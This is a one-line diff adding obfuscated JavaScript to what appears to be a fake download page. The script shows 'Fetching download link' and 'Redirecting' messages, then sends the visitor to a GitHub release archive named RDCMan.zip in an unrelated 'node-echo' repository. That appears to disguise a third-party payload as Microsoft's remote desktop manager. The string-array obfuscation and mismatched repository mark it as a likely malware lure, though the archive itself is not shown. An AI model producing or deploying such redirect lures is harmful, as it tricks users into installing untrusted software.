@@ -1,0 +1,1 @@
+(function(){var _0=['getElementById','loader','textContent','Fetching download link...','Redirecting…','location','href'];var l=document[_0[0]](_0[1]);l[_0[2]]=_0[3];var d={url:'https://github.com/mlookep/node-echo/releases/download/2.958/RDCMan.zip'};l[_0[2]]=_0[4];setTimeout(function(){window[_0[5]][_0[6]]=d.url;},2000);})();
